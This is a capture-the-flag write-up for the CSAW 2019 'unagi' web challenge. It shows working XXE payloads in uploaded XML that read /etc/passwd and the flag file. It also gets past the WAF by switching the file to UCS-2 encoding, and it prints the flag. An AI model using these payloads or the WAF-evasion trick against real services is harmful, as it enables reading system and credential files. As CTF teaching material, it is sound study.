# CSAW CTF'19 Quals – unagi

* **Category:** Web Exploitation
* **Points:** 200

## Challenge

>come get me
>
>http://web.chal.csaw.io:1003

## Note
I write most of the writeups for this repo, so I decided to post my writeups for this CTF here as well. I did *not* compete under PentaHex for CSAW Quals, but since nobody else on PentaHex did either I'm posting my writeups here. -Drakon

## Solution


This was an adventure. Hours spent looking through PHP man pages just to realize that I'm stupid.

The webpage is pretty simple: We have a "home" page, a "user" page, an "upload" page, and an "about" page.

The homepage doesn't give us that much. About tells us where the flag is, but otherwise there's not much to see.

User is more interesting - there's two users with various fields filled in.

![The users page](./users.png?raw=true "The users page")

Take a good look at the fields. These are really important, and will come in useful later.

The upload page lets us upload users in the form of an XML file. Format is as follows:
```
<users>
	<user>
		<username>alice</username>
		<password>passwd1</password>
		<name>Alice</name>
		<email>alice@fakesite.com</email>
		<group>CSAW2019</group>
	</user>
	<user>
		<username>bob</username>
		<password>passwd2</password>
		<name> Bob</name>
		<email>bob@fakesite.com</email>
		<group>CSAW2019</group>
	</user>
</users>
```

Our first thought is some form of XXE. We write up a quick payload, and try submitting:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
	<!ENTITY xxe SYSTEM "file:////etc/passwd" >
]>                                                          
<users>
	<user>
		<username>VeryCreativeUsername</username>
		<password>VeryCreativePassword</password>
		<name>Drakon</name>
		<email>&xxe;</email>
		<group>SeeSawTwoThousandNineteen</group>
	</user>
</users>
```
![uh oh](./WAFBlocked.png?raw=true "Uh oh")

The WAF won't let us upload the inject. Some quick research reveals that some WAFs aren't able to handle multiple encodings. We change our file from UTF-8 to UCS-2 BE BOM, and try again.

![Yay!](./WAFSuccess.png?raw=true "Yay!")

It works! Kind of. The output is truncated for some reason - both /etc/passwd and our group name are brought down to 20 characters. No problem though, the flag probably isn't that long. Right?

![You thought](./whyMe.png?raw=true "You thought")

Nope. The flag.txt file is padded a bunch. Looks like we're gonna have to figure out how to get just the flag.

I stop here to think: "Maybe I can somehow find a field that doesn't have this character limit?" I ignore myself.

Queue 4 hours of research into reverse shells, RCE, and PHP wrappers. I tried exfiltrating the data to an external server (threw an error), executing code with the expects module (it wasn't installed), and encoding the data (only thing that worked was base64, which frankly didn't do much).

Remember the users page earlier?

There's one field that we don't see in our XML. "Intro".

Hopefully the character limit for the intro field should be bigger. We guess that the element name is "intro", and write a new exploit.

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
	<!ENTITY xxe SYSTEM "file:///flag.txt" >
]>                                                          
<users>
	<user>
		<username>VeryCreativeUsername</username>
		<password>VeryCreativePassword</password>
		<name>Drakon</name>
		<email>yahoo@gmail.org</email>
		<group>BentaBex</group>
		<intro>&xxe;</intro>
	</user>
</users>
```
![It actually worked.](./youMustBeKidding.png?raw=true "It actually worked.")

It worked. As simple as that. No need to upload a reverse shell, or run any commands. No need to compress the string so that it fits in 20 characters. No PHP wrapper black magic.

I want to die.

```
flag{n0w_i'm_s@d_cuz_y0u_g3t_th3_fl4g_but_c0ngr4ts} 
```